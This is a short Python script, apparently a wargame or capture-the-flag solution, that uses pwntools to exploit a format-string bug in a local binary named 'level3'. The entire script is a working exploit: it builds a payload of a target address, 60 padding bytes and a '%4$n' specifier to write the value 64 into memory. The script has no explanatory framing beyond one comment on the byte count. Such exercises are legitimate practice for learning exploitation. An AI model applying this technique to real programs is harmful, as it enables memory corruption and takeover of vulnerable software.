from pwn import *

ADRESS = 0x0804988c

p = process('./level3')

payload = p32(ADRESS)
payload += b'|' * 60         # We need to write the value 64, ADRESS is 4 bytes, so we need 60 more for %n
payload += b'%4$n'


print(p.clean().decode('latin-1'))
p.sendline(payload)
print(p.clean().decode('latin-1'))

